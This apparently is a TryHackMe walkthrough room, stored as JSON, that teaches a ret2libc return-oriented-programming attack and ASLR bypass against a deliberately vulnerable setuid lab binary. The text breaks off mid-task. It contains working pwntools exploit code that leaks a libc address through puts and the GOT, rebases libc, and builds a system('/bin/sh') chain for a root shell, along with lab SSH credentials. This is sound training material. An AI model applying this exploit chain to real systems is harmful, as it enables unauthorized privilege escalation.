{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/d65af346cba59c68f37e9709d3a3ccb4.png', 'title': 'ret2libc', 'description': 'This room teaches basic return-oriented programming (ROP), exploitation of binaries and an ASLR bypass.', 'code': 'ret2libc', 'users': 1521, 'tags': ['#binary', '#ret2libc', '#rop', '#ASLR', '#reverse engineering', '#python'], 'type': 'walkthrough', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 129, 'created': '2021-09-10T11:36:57.928Z', 'published': '2022-01-26T19:00:00.233Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://assets.tryhackme.com/img/banners/default_tryhackme.png', 'creator': '0x21q', 'tasks': [{'taskTitle': 'Prerequisites', 'taskDesc': '<p><b>Before we start.</b><br /></p><p>This room is a bit more advanced. If you are new to binary exploitation, reverse engineering, basics of c programming and scripting with Python, I strongly recommend you do the rooms linked below first to get some essential knowledge.<br /></p><ul><li><a href="https://tryhackme.com/room/win64assembly" target="_blank">Windows x64 Assembly</a><br /></li><li><a href="https://tryhackme.com/room/pythonbasics" target="_blank">Python Basics</a></li><li><a href="https://tryhackme.com/room/introtopwntools" target="_blank">Intro To Pwntools</a></li><li><a href="https://tryhackme.com/room/windowsreversingintro" target="_blank">Windows Reversing Intro</a><br /></li></ul>', 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2021-09-10T12:45:43.425Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'I know the essentials of binary exploitation and want to continue!<br />', 'hint': ''}]}, {'taskTitle': 'Introduction', 'taskDesc': '<p>So welcome to the room ret2libc! ðŸ˜Ž</p><p>Before we start, d<span style="font-size:1rem">eploy the machine attached to the task by pressing the green "<b>Start Machine</b>" button, as well as the AttackBox if you don\'t want to bother installing additional tools (using the "<b>Start AttackBox</b>" button at the top of the page) or you can use your own machine and connect through OpenVPN.</span></p><p>Keep in mind the booting can take up to <b>3 minutes</b>.</p><p> And while you wait, let me tell you what return-oriented programming (ROP) is and how the ret2libc attack works.</p><h4><b>Return oriented programming (ROP)</b></h4><p></p><ul><li>The basis of return-oriented programming is chaining together small chunks of code already present within the binary itself in such a way as to do what we wish. For example, reading flag.txt file, or even better, getting a shell.<br /></li></ul><h4><b><b>ret2libc attack</b></b></h4><p></p><ul><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">The ret2libc is ROP with a small difference. The difference is that these small chunks of code which we\'ll be using are in the dynamically linked c library called libc.</span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Why do we use libc? Well, it\'s already linked to our binary, and libc has some of the functions which are interesting to us. One of the functions which are useful to us is called "system" which lets us execute anything passed to it.</span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Now, what if I tell you that in libc, there is also a string value that looks like this: "/bin/sh". I think you now know where this is going.</span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">All we have to do is create an ROP chain (small chunks of code chained together) that passes the "/bin/sh" string as the argument to the system function and then call this function.</span></li></ul><p>And that\'s it. You now know how the ret2libc attack works.</p><p><b>If you are done reading, and your machine is ready, use these <b>ssh credentials</b> to connect:</b></p><ul><li>Username: <b style="font-weight:bold">andy</b></li><li>Password:<b> <b>ret2libc!</b></b></li></ul>', 'taskType': 'vm', 'taskNo': 2, 'taskCreated': '2021-09-10T12:14:55.059Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '613e5541c2319f0058624b9f', 'questions': [{'questionNo': 1, 'question': 'Start the machine!<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the name of the function which is essential for ret2libc attack?<br /></p>', 'hint': ''}]}, {'taskTitle': 'Tools used', 'taskDesc': '<p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Throughout the room, I\'ll be using listed tools that make the process of binary exploitation and reverse engineering much easier. I\'ll provide you links to the official documentation of every tool so you can install them on your machine if they aren\'t already.\xa0</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><strong><br /></strong></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><strong>Pwntools and gdb with gef are already preinstalled in the attached VM.</strong></p><p><span style="background-color:transparent"></span></p><h4><b style="font-size:1.5rem">Pwntools</b><br /></h4><p></p><p>The first thing on this list is a python library called pwntools, which we\'ll use for creating our exploit script. Pwntools should already be installed on Kali Linux.</p><p>Link (pwntools):\xa0<a href="https://docs.pwntools.com/en/stable/install.html" target="_blank">https://docs.pwntools.com/en/stable/install.html</a></p><p></p><h4><b>gdb + gef</b></h4><p></p><p>The second thing on the list is the debugger, I use gdb with a plugin called gef, but if you are using any other plugin like pwndbg or peda, you should be fine as well. Gdb should be available as a package on your Linux distribution.</p><p>Link (gdb):\xa0<a href="https://www.sourceware.org/gdb/" target="_blank">https://www.sourceware.org/gdb/</a><br /></p><p>Link (gef):\xa0<a href="https://gef.readthedocs.io/en/master/#setup" target="_blank">https://gef.readthedocs.io/en/master/#setup</a></p><p></p><h4><b>Ghidra</b></h4><p></p><p>And the last thing on this list is a reverse engineering tool called Ghidra. Ghidra is already installed in the THM Attack box, so if you don\'t want to bother with downloading it, you can use it there.</p><p>Link (ghidra):\xa0<a href="https://ghidra-sre.org/" target="_blank">https://ghidra-sre.org/</a></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2021-09-10T12:37:56.018Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'I understand which tools are used throughout the room, and I am ready to continue!', 'hint': ''}]}, {'taskTitle': 'Review of the binary', 'taskDesc': '<p></p><p></p><p></p><p>After connecting to the box, go to the andy\'s home directory. There you should find a binary called exploit_me. </p><p>You can see is that the binary is glowing red... hmm. What does that mean? I guess you already know that, but in case you don\'t, let\'s check the binary permissions.<br /></p><p><code>ls -la exploit_me</code><br /></p><p>You can see there\'s a setuid bit in place which means we could maybe escalate privileges? (If the binary has a setuid bit set, it means you can run the binary as the owner of this binary). Let\'s keep this in mind for later and move on.<br /></p><p><br /></p><h4><span style="font-weight:bolder">Architecture</span><br /></h4><p>The next thing we should check is the architecture of the binary, especially if it\'s a 32-bit or 64-bit executable. We can do that with the file command.<br /></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Architecture</div><pre class="terminal-code language-shell-session" style="font-size:14px"><code class="language-shell-session">andy@ubuntu:~$ file exploit_me\nexploit_me: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped</code>\n        </pre></div></div><p>As you can see we\'re working with a 64-bit binary. </p><p>You might ask, why does that matter to us? There are many things we can take from that information, but the crucial section to us is which calling conventions are being used. </p><p>In short, calling conventions are a set of rules used, for example, when the program is calling functions or passing parameters. </p><p>Later, when we craft our ROP chain, we have to apply these rules so the program can understand our instructions and our exploit script can work without any problems. </p><p>Now that we know what the calling conventions are and which architecture is our binary. We just have to find the exact calling convention for our binary. I made it easy for you and already found it on the Wikipedia page\xa0<a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank">here</a>, almost at the bottom.<br /></p><table class="table table-bordered" style="width:1076px"><tbody><tr></tr></tbody></table><table class="table table-bordered" style="width:1076px"><tbody><tr><td><span style="font-weight:bolder">Architecture</span><br /></td><td><span style="font-weight:bolder">Name</span><br /></td><td><span style="font-weight:bolder">Operating system, compiler</span><br /></td><td><span style="font-weight:bolder">Register order for parameters (arguments)</span><br /></td></tr><tr><td>x86-64<br /></td><td>System V AMD64</td><td><p><a href="https://en.wikipedia.org/wiki/Solaris_(operating_system)" class="mw-redirect">Solaris</a>,\xa0<a href="https://en.wikipedia.org/wiki/Linux">Linux</a>,\xa0<a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution">BSD</a>,\xa0<a href="https://en.wikipedia.org/wiki/MacOS">macOS</a>,\xa0<a href="https://en.wikipedia.org/wiki/OpenVMS">OpenVMS</a>\xa0(<a href="https://en.wikipedia.org/wiki/GNU_Compiler_Collection">GCC</a>,\xa0<a href="https://en.wikipedia.org/wiki/Intel_C%2B%2B_Compiler">Intel C++ Compiler</a>,\xa0<a href="https://en.wikipedia.org/wiki/Clang">Clang</a>,\xa0<a href="https://en.wikipedia.org/wiki/Delphi_(IDE)" class="mw-redirect">Delphi</a>)</p></td><td>RDI, RSI, RDX, RCX, R8, R9, [XYZ]MM0â€“7</td></tr></tbody></table><p>The table above tells us which architecture this calling convention is, its name, which operating system, and on the right-hand side is the important stuff.\xa0\xa0</p><p>Let\'s use as an example any c-function that has one argument. Let\'s say puts, for example. Now let\'s go over what the last thing in this table tells us. It says that if we want to give some data as the argument to our puts, we first need to move the data into the $RDI register.\xa0\xa0</p><p>If we would have some other function with more arguments, let\'s say three. For the first argument, we\'d use register $RDI, for the second $RSI, and the last one $RDX.\xa0\xa0</p><p>This way, our binary\xa0<span style="font-size:1rem">will</span><span style="font-size:1rem">\xa0understand what we want to pass as an argument to the function.</span></p><p><br /></p>\n<h4><b>Running the binary</b></h4>\n<p>When we run a binary, it prompts us to type our name. When we do that, it prints out our name on the screen.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">Running the binary</div>\n        <pre class="terminal-code language-shell-session"><code class="language-shell-session">andy@ubuntu:~$ ./exploit_me\nType your name:\nandy\nYour name is: andy</code>\n        </pre>\n    </div>\n</div>\n<p>The first thing that should hit our head when seeing the binary like this in the CTF is if the binary is vulnerable to buffer overflow.\xa0\xa0</p><p>Let\'s try that by simply writing 30 A\'s instead of our name.</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">Buffer overflow</div>\n        <pre class="terminal-code language-shell-session"><code class="language-shell-session">andy@ubuntu:~$ ./exploit_me\nType your name:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nYour name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSegmentation fault (core dumped)</code>\n        </pre>\n    </div>\n</div>\n<p>And as we can see, we got a segmentation fault which means that our binary is vulnerable to a buffer overflow attack.</p><p><br /></p><p> </p>\n<h4><b>Finding the offset</b></h4>\n<p>The next thing we need to figure out is the offset of this overflow. By offset, I mean the minimum number of A\'s (bytes) required for the segmentation fault to happen. We can find this in gdb and use a command called pattern, which comes with gef. Open the binary in the gdb with\xa0<code>gdb exploit_me</code></p>\n<p>Once we have our binary open, we need to generate the pattern that we\'ll be giving to our binary as an input instead of the\xa0 A\'s that we used earlier. Generate the pattern in gdb with the command\xa0<code>pattern create</code></p>\n<p>Once you have created the pattern, copy the output (= long text with lots of a\'s) and then run the binary inside of the gdb simply by typing: <code>r</code></p>\n<p>You\'ll get prompted for the name, so paste our created pattern here and hit enter. You should see values for the registers, the stack etc., from when the segmentation fault occurred, but that\'s not the important thing here. All we need to do is read the data from the $RSP register and use it in the pattern search command. We can do that easily with\xa0<code>pattern search $rsp</code></p>\n<p>If you followed me step by step, you should see the offset in the gdb by yourself and keep it in mind because we\'ll need it for crafting our exploit.\xa0\xa0</p><p><b>Note:\xa0</b>If we were working with a 32-bit binary, we\'d look for the data for our pattern search in the $RIP register.</p>\n<h4><b><br /></b></h4><h4><b>Protections</b></h4>\n<p>Another important part of reviewing the binary is looking for binary protections. For that, we can use command checksec, which comes preinstalled with\xa0<b>pwntools</b>.<br /></p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">Binary protections</div>\n        <pre class="terminal-code language-shell-session"><code class="language-shell-session">andy@ubuntu:~$ checksec exploit_me\n[*] \'/home/andy/exploit_me\'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)</code>\n        </pre>\n    </div>\n</div>\n<p>\nI\'d like to talk about every protection in-depth but this would make this room even longer than it is, but if you followed my advice and completed room <a href="https://tryhackme.com/room/introtopwntools" target="_blank">Intro To Pwntools</a>, you should have a basic idea of what every protection is doing.<br /></p>The main things we should take from this:<ul><li>The binary has <b>Partial RELRO,</b> which means that the\xa0<b>global offset table</b> is read and writable.</li><li> <b>Stack canary</b> isn\'t found, which means that if there is any buffer overflow, we can simply abuse it.</li><li><b>NX</b>\n is enabled, which means that we cannot execute custom shellcode from the stack, and it\'s also the main reason we\'re using the ret2libc attack.<br /></li><li><b>PIE</b> is disabled, which means that our binary will always start at the address 0x400000 and won\'t be affected by <b>ASLR</b>.</li></ul><p>On the next task, we\'ll discuss the\xa0<span style="font-size:1rem;font-weight:bolder">global offset table (GOT)</span><span style="font-size:1rem">, </span><b style="font-size:1rem">ASLR</b><b style="font-size:1rem"> </b><span style="font-size:1rem">and\xa0</span><span style="font-size:1rem">how it affects our exploitation.</span></p><span class="emoji"></span><p></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2021-09-10T23:54:28.046Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What are the permissions of the exploit_me binary?<br />', 'hint': 'format: xxxxxxxxxx number owner group'}, {'questionNo': 2, 'question': '<p>At which address will exploit_me binary start?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the overflow offset that we found in gdb?</p>', 'hint': ''}]}, {'taskTitle': 'ASLR &amp; GOT', 'taskDesc': '<h4><b>Address space layout randomization (ASLR)</b><br /></h4><p>Address space layout randomization is a technique involved in preventing exploitation of memory by randomly arranging the address space positions of key data areas of processes and the positions of the stack, heap and libraries.<br /></p><p>First of all, we can check if ASLR is turned on in our VM with the command:</p>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">ASLR check</div>\n        <pre class="terminal-code language-shell-session"><code class="language-shell-session">andy@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space\n2\n</code>\n        </pre>\n    </div>\n</div>\n<p><span style="font-size:1rem">According to </span><a href="https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/" target="_blank">this</a><span style="font-size:1rem"> article, n</span><span style="font-size:1rem">umber</span><span style="font-size:1rem">\xa0</span><span style="font-size:1rem;font-weight:bolder">2</span><span style="font-size:1rem">\xa0means full randomization.</span><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">This means the ASLR is turned on.</span><br /></p><p>So how does it affect our binary, you might ask? Didn\'t I say that our binary isn\'t affected by ASLR because there is no PIE protection?</p><p>Yes, you\'re right, it\'s not affected, but the thing which is being affected is the libc, which is dynamically linked to our binary and is mandatory for our ret2libc attack to work. If you look closer at the ASLR definition again, you can see the word library right at the end, and guess what libc is. Yes, that\'s right, it\'s a library.</p><p>But, because of ASLR, we now cannot call the system function because we don\'t know the address of this function in libc. </p><p>And even if we try to find the address of the system function when we run the program, the next time we run it, it\'ll be a different address. So how do we bypass this? Before telling you how to do that, let me quickly explain the global offset table.</p><p><br /></p><h4><b>Global Offset Table (GOT)</b></h4><p>The global offset table is a section inside a program that holds addresses of dynamically linked\xa0<span style="font-size:1rem">functions</span><span style="font-size:1rem">.\xa0\xa0</span></p><p>Most programs don\'t include every function they use to reduce binary size. Instead, common functions, like those in libc, are "linked" into the program.\xa0\xa0</p><p>All dynamic libraries are loaded into memory along with the main program at launch; however, functions aren\'t mapped to their actual code until they\'re first called.\xa0\xa0</p><p>But, after these functions are called for the first time, their real addresses are "saved" in the section of the program called .got.plt.</p><p><br /></p><h4><b>ASLR Bypass</b></h4><p>So, in theory, we need to leak the address of any function which is in libc and is being used in our binary (so it\'ll be saved in <b>.got.plt</b>). I\'ll show you how to find these functions later in Ghidra. But how do we leak it?</p><p>We need some function that can print values and can take a pointer as an argument. The perfect functions for this are <b>puts </b>and <b>printf</b>.</p><p>So what we can do now is to call puts and, as an argument, pass a pointer to any function that\'s inside <b>.got.plt</b>.</p><p>For example: If we call puts and as an argument, we pass the address of the setbuf function inside of .<b>got.plt</b> section, then we should have leaked the real address of the sefbuf function inside a libc. And when we have this leak, we can calculate the base address of the libc.</p><p><b>Libc base address =&gt; Start of the c library in memory</b></p><p>And when we have this base address, every time the binary is being run, the address is the same as it would have been when ASLR was turned off,\xa0 and from that, we can calculate offsets for every function inside of libc. Or we can even rebase our libc, which I\'ll talk about in the next task.</p><p><b>Note</b>: If you don\'t understand this on your first read, don\'t worry; take your time and read through it slowly. In the next tasks, I\'ll show you everything in practice so it might come all together once you see it.</p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2021-09-13T23:00:59.050Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the name of the section of the binary which is important for our leak?<br />', 'hint': ''}]}, {'taskTitle': 'Examining in the Ghidra', 'taskDesc': '<p></p><p></p><p><b style="font-size:1.5rem">Transfer the binary</b></p><p>Ghidra is a GUI program, so we cannot run ghidra on an attached VM, but we have to run it on our own machine (or in the AttackBox)\ninstead.\xa0<br /></p><p>Before transferring the binary, make sure that your machine uses the same libc as the attached VM; otherwise, you could encounter some problems (you can use <code>ldd exploit_me</code> to do that). If you still have problems, I recommend using Kali Linux or the THM AttackBox to review the binary in ghidra.<br /></p><p>Let\'s start by transferring the <b>exploit_me</b> binary to your machine. We can do that with a python3 server.</p><p> </p><p>In the attached VM run command:</p><p><code>python3 -m http.server 4444</code></p><p>On your own machine\xa0<span style="font-size:1rem">(or in the AttackBox),</span><span style="font-size:1rem">\xa0run the command:</span></p><p><code>wget http://MACHINE_IP:4444/exploit_me</code></p><p><br /></p><h4><b>Examine the binary in Ghidra</b><br /></h4><p>Open the binary in Ghidra and analyze it. If you are ready, let\'s examine the main function. </p><p>In the middle left is a window called <b>Symbol Tree,\xa0</b>and there\'s our main function inside a Functions folder; once you find it, double click on it.<br /></p><code>Symbol Tree -&gt; Functions -&gt; main</code><p></p><p></p><p>Now on the right side of the screen, you should see a decompiled main function that should look like this:</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9edb4b86481a1cfc867ddf/room-content/9642c13fab349ee004cb89843fb0b99f.png" /><br /></p><p>As you can see, Ghidra does a pretty good job when decompiling small binaries like ours.</p><p>From what we can see, there\'s an array of chars called local_12 with a size of 10 bytes.\xa0</p><p>We know that our overflow offset is a little bigger than that. It\'s because, in memory between our buffer and instruction pointer, there is\xa0<span style="font-size:1rem">other data that</span><span style="font-size:1rem">\xa0we also need to overflow.</span></p><p>On line 9, you can see that the input we provide to the binary is stored in this buffer. It\'s done by the gets function, which is dangerous, and you wouldn\'t use it in a standard program. </p><p>Why is it dangerous? Because this function doesn\'t regulate the size of the input. This means we can provide input that is 30 bytes long, but our buffer only takes 10. This is why the segmentation fault is occurring. And it\'s also the reason why we can abuse this binary.</p><p>There\'s another really interesting thing, and that\'s the setuid(0) function. It seems like a good day for us as an attacker. </p><p>If you remember well, we found out that our binary had the setuid bit set, but that in itself wouldn\'t give us a root shell when running the exploit. That\'s because we aren\'t specifying the -p switch when passing our "/bin/sh" argument to our system function. In the libc, there is only string "/bin/sh" and not string "/bin/sh -p" which we\'d need for that. </p><p>The reason why it\'s not working without the -p switch is that the real UID of the process isn\'t matching the effective UID. If you want to read about real, effective and saved UID in Linux, you can click <a href="https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/" target="_blank">here</a>.<br /></p><p>Anyway, this doesn\'t matter to us because we can escalate privileges with our ret2libc exploit even without the -p switch, thanks to the setuid(0) function inside of the binary.</p><p><br /></p><h4><b>Finding the leak function</b><br /></h4><p>Now let\'s find our leak function.</p><p>In the left upper corner, there\'s a window called <b>Program Trees,</b>\xa0where we can see sections of the program. We\'re interested in the section called <b>.got.plt </b>that we discussed earlier.</p><p><code>Program Trees -&gt; exploit_me -&gt; .got.plt</code></p>When you double click on that, you should see which functions are in the <b>.got.plt</b> section.<br /><p></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9edb4b86481a1cfc867ddf/room-content/62592dbac9dcc3247c726c1c508eb4ac.png" /></p><p>On the left, you can see an address next to each function, and that address is exactly the one that we\'ll be passing to the puts function as an argument. As I said in the previous task, we can choose any function from these three (puts, printf, gets); it doesn\'t matter which function as long as we keep in mind which we\'ve chosen.<br /></p><p>I\'ll use <b>gets </b>as my leak function. Now we have our argument ready, and the only thing we need to do is pass it to the puts function. But how do we call puts?<br /></p><p>We can find <b>puts </b>in the procedure linkage table (PLT) and call it from there. I won\'t be talking about PLT here, but we need to know where to find this PLT section in Ghidra. If you want to learn more about PLT and even some more about GOT, you can watch a fantastic video from LiveOverflow called Global Offset Table (GOT) and Procedure Linkage Table (PLT) on YouTube, which I recommend.</p><p><span style="font-size:1rem">Now let\'s look at the <b>.plt</b> section.<br /></span><br /><span style="font-size:1rem"><code>Program Trees -&gt; exploit_me -&gt; .plt</code></span></p><p><span style="font-size:1rem">The puts function inside the .<b>plt</b> section looks like this.</span></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f9edb4b86481a1cfc867ddf/room-content/3f099001fe83515047ef196efb1388fd.png" /><span style="font-size:1rem"><br /></span></p><p><span style="font-size:1rem">Now we have everything ready for our exploit!<br /></span></p><p><span style="font-size:1rem"><br /></span></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2021-09-10T23:58:32.857Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the name of the function that is under gets in .got.plt?<br />', 'hint': ''}]}, {'taskTitle': 'Creating the exploit', 'taskDesc': '<p>In this part, we\'ll create the exploit. Open vim or nano and create a new python script to start things off. If you prefer a different editor over vim or nano (which are installed in the attached VM), you can create this script on your own machine and then transfer it via a python server as we did with our exploit_me binary.<br /></p><p><br /></p>\n<h4>Part 1</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Importing the library\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">#!/usr/bin/env python3\nfrom pwn import *</code>\n        </pre>\n    </div>\n</div>\n<p><code>#!/usr/bin/env python3</code> is a shebang that makes our script a standalone executable, which means we don\'t need to run the script with python3.</p><p>On the second line, we see <code>from pwn import *</code> which means we\'re importing everything from the pwn library into our script.</p><p><br /></p>\n<h4>Part 2</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Defining variables\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">context.binary = binary = \'./exploit_me\'\n\nelf = ELF(binary)\nrop = ROP(elf)\n\nlibc = ELF(\'/lib/x86_64-linux-gnu/libc.so.6\')\n\np = process()</code>\n        </pre>\n    </div>\n</div>\n<p>On the first line, we\'re assigning the exploit_me binary into the binary variable and then adding this binary to the context. Context is a global variable that automatically sets settings (like architecture, operating system, bit-width) for our binary. So later, when we\'ll use our binary variable, we don\'t have to specify every setting manually.</p><p>On the next line, we\'re creating a variable called <code>elf </code>so that we can manipulate it with our binary as an ELF object inside of our script. Once the variable has been created, we use that <code>elf </code>variable to create an ROP object called <code>rop</code>. We\'ll use both of these variables later in the code.</p><p>Next, we\'re creating a variable called <code>libc </code>and assigning the full path of libc to it. Our binary will be using libc as an ELF object. If you don\'t know how to find which libc our binary is using, you can do that with the command ldd: <code>ldd exploit_me</code></p><p>The last thing we\'re doing is spawning our binary as a process. You can see that we didn\'t specify which process to spawn; that\'s because we added our binary into the context. Now we\'ll start creating the ROP chain to leak the gets function.</p><p><br /></p>\n<h4>Part 3</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            First ROP chain\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">padding = b\'A\'*18\npayload = padding\npayload += p64(rop.find_gadget([\'pop rdi\', \'ret\'])[0])\npayload += p64(elf.got.gets)\npayload += p64(elf.plt.puts)\npayload += p64(elf.symbols.main)</code>\n        </pre>\n    </div>\n</div>\n<p>Now we have everything ready to start the first ROP chain to leak the libc base address.</p><p>In the ROP chain, the first thing we do is create the variable <code>payload </code>and assign our overflow offset (=padding) to it.\xa0</p><p>The basic logic of the ROP\xa0<span style="font-size:1rem">leak</span><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">chain is as follows:</span></p><ol><li>Popping the <b>$RDI</b> register for our argument</li><li>Filling the <b>$RDI</b> register with the address of the gets function</li><li>Executing the puts function with loaded argument</li><li>Returning to the main program with already leaked function</li></ol><p>Now let\'s break down every function in this part so you can fully understand what is going on.</p><p><code>p64()</code></p><ul><li>Returns the byte string from the data passed in the argument.</li></ul><p><code>rop.find_gadget([\'pop rdi\', \'ret\'])[0])</code></p><ul><li>Returns an array of all addresses in memory where the instructions [\'pop rdi\', \'ret\'] occur, and since we only need the first one, we specify [0] for the first value in the array.</li></ul><p><code>elf.got.gets</code></p><ul><li>Returns the address of the gets functions from the .got.plt section, which we discussed in the previous task.</li></ul><p><code>elf.plt.puts</code></p><ul><li>Returns the address of the puts function from the .plt section.</li></ul><p><code>elf.symbols.main</code></p><ul><li>Returns the address of the main function.</li></ul><p>Now that we have crafted the payload for our leakage, we need to send the payload, then receive and process the returned leak of the function.</p><p><br /></p>\n<h4>Part 4</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Sending and processing\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">p.recvline()\np.sendline(payload)\np.recvline()\nleak = u64(p.recvline().strip().ljust(8,b\'\\0\'))\np.recvline()</code>\n        </pre>\n    </div>\n</div>\n<p>In this part, you can see that we\'re using <code>p.recvline()</code> multiple times.\xa0With this function, we\'re getting rid of any unnecessary lines which may be printed in our terminal when running the exploit.\xa0<span style="font-size:1rem">W</span><span style="font-size:1rem">e\'re trying to process the input so that you only see the leaked address being </span><span style="font-size:1rem">outputted</span><span style="font-size:1rem">.\xa0</span></p><p>With <code>p.sendline(payload)</code>\xa0we\'re sending our created leakage payload. And the last thing we need to do is process the leak into a usable format. In its original state, the leak is a byte string, and we need it as a normal address, so that means we need to convert it somehow.</p><p><span style="font-size:1rem">We do that conversion with this line:</span></p><p><code>leak = u64(p.recvline().strip().ljust(8,b\'\\0\'))</code></p><p>Let me explain what everything does in case you\'re curious. If not, you can skip this part and just keep in mind that it is processing the address to a usable and readable format.</p><p><code>u64()</code></p><ul><li>So with this function, we\'re unpacking the byte string. But here comes one little problem, which is solved by the next function.</li></ul><p><code>ljust(8,b\'\\0\'))</code></p><ul><li>One issue here is that the <code>u64()</code> function cannot unpack a byte string that isn\'t precisely 64 bits long (=8 bytes). Since our address doesn\'t come in this size, padding is required.</li><li>This padding is done by adding additional null bytes (before we unpack it) to the beginning of the string so that we have a byte string that is exactly 64 bits (=8 bytes) long.</li><li>The first argument is the final length of the byte string. In our case, it\'s 8.</li><li>The second argument is the byte that is being prefixed until the byte string is exactly 8 bytes long. In our case, it\'s the null byte.</li></ul><p><code>strip()</code></p><ul><li>At the end of our byte string is the new line character <b>\\n</b>, which we want to get rid of, and the strip function does exactly that.</li></ul><p><code>p.recvline()</code></p><ul><li>Is just reading the initial byte string.</li></ul><p>If you are done reading, let\'s move on to the next part.</p><p><br /></p>\n<h4>Part 5</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Rebase of libc\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">log.info(f\'Gets leak =&gt; {hex(leak)}\')\nlibc.address = leak - libc.symbols.gets\nlog.info(f\'Libc base =&gt; {hex(libc.address)}\')</code>\n        </pre>\n    </div>\n</div>\n<p>In this part, we\'re printing our processed leak address. And then there\'s a little bit of math involved in calculating the base address.</p><p><span style="font-size:1rem">Let me explain it.\xa0</span><br /></p><ul><li>Imagine our leak as some address that changes every time. The only thing that we know about it is that this address belongs to the gets function. We want to calculate the base address of the libc, which will also be different every time.</li><li>But now comes the interesting part. The range between the base address and the gets function is always the same. And since we can treat addresses like numbers, we can just subtract the address of the gets function from our leak.</li><li>This gives us the base address of the currently linked libc, and we print this value out to check if we\'ve done everything correctly.</li><li>We know everything is correct when the base address ends with three 0\'s.</li></ul><p>Now when we have figured out how to evade ASLR protection, we can continue with the actual ret2libc exploit.</p><p><br /></p>\n<h4>Part 6</h4>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Second ROP chain\n        </div>\n        <pre class="terminal-code"><code class="language-shell-session">payload = padding\npayload += p64(rop.find_gadget([\'pop rdi\', \'ret\'])[0])\npayload += p64(next(libc.search(b\'/bin/sh\')))\npayload += p64(rop.find_gadget([\'ret\'])[0])\npayload += p64(libc.symbols.system)</code>\n        </pre>\n    </div>\n</div>\n<p>We can start by creating another payload. And we can reuse the variable payload for this.\xa0<span style="font-size:1rem">So once again, we can begin by assigning the already created padding as the beginning of the payload to cause the buffer overflow.</span></p><p>The basic logic of the "spawn shell" ROP chain:</p><ol><li>Popping the <b>$RDI</b> register for our argument.</li><li>Filling the <b>$RDI</b> register with the byte string "/bin/sh".</li><li>Ret instruction is for the stack alignment (just think of this as something that we need to do; otherwise, some problems may occur).</li><li>Executing the system function with a loaded argument.</li></ol><p>Now let\'s break down every function in this part so you can fully understand what is going on.</p><p>We\'ve already talked about the\xa0<code>p64()</code> and <code>find_gadget()</code> functions, so I\'ll skip 